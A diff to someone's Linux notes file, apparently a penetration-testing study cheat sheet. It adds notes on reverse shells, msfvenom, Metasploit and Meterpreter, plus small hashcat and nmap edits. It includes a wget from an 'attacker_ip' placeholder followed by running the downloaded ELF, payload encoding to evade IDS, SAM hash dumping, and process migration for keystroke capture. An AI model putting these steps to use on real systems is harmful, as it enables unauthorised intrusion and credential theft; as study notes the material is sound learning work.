@@ -1,6 +1,52 @@
 LINUX
+	Reverse Shells
+		python3 -m http.server 9000
+			wget http:attacker_ip:9000/file_path to download file to remote pc
+		./path_to_file to run the .elf file
+	Msfvenom
+		msfvenom (FLAGS) (Options)
+		FLAGS
+			-l payloads/encoders | lists all payloads/encoders
+			-p {payload} specifies payload to use
+			-f | specifies format of the payload
+			-e | encodes the payload to avoid IDS and obsfucates
+
+	Metasploit
+		msfconsole to enter
+		use {xyz} to enter exploit module
+		show options to show all parameters available to be set
+		set {parameter} {value} sets parameter in the exploit youre in. Resets upon leaving. (can also set files as values from host pc)
+			setg to set parameters for all other modules if using the same parameter.
+			unset all/payload
+			unsetg xyz
+		info {exploit} or be in exploit and enter info for detailed informations
+		exploit to run the exploit
+			-z to do it in the background
+			ctrl z or "background" in meterpreter
+		sessions to show background connections
+			-i {x-z} to select the session
+			-k {id} to kill or leave id to kill all
+			
+		back leaves the exploit
+ 		search (flag)
+		FLAGS
+			type:value (exploit, payload, auxiliary, encoder, evasion, post, nop)
+			name:value
+			platform:value (windows, linux etc...)
+			cve:value
+	Meterpreter
+		help lists all the commands
+		guid gets the GUID of the session
+		search -f {file_string} used to find files
+		hashdump dumps all the hashes in the SAM
+		getuid display user privileges and rights
+		ps to display all processes.
+		migrate {process_id} to migrate to a process (useful for keystroke scan on certain apps like Excel, Word etc...)
+		use "xyz" when refering to paths
+		
+
 	Hashcat
-		hashcat -m -a {hashfile} {wordlist}
+		hashcat -m x -a y {hashfile} {wordlist}
 		FLAGS
 			-m specifies the hashtype in numeric format, e.g -m 1000 is NTLM. use man hashcat for more codes.
 			-a specifies the attackmode, -a 0 = 1 password after the other from the wordlist
@@ -32,7 +78,7 @@ LINUX
 			-sV Service Version scan
 			-A O & sV together plus other things
 			-Pn treat every Host as Online and force scan.
-
+			-v verbosity level (-v or -vv)
 			-oN {filename} -saves as normal output
 			-oG GREPable output
 		TIMINGS
@@ -51,10 +97,10 @@ LINUX
 		grep "string" {file} (-r = recursively thru all files inside a dir)
 			grep -r "string" /dir/
 
-  Pathing
-    cd /foo/bar/ is an absolute path the ROOT of the filesysem, then foo, then bar
-    cd ../foo/bar Is relative and goes UP one directory, looks for foo, then bar
-    cd foo/bar is relative and does not go up first. ./ refers to the current directory
+  	Pathing
+    		cd /foo/bar/ is an absolute path the ROOT of the filesysem, then foo, then bar
+   		cd ../foo/bar Is relative and goes UP one directory, looks for foo, then bar
+    		cd foo/bar is relative and does not go up first. ./ refers to the current directory
 
 	SSH
 		ssh name@ip
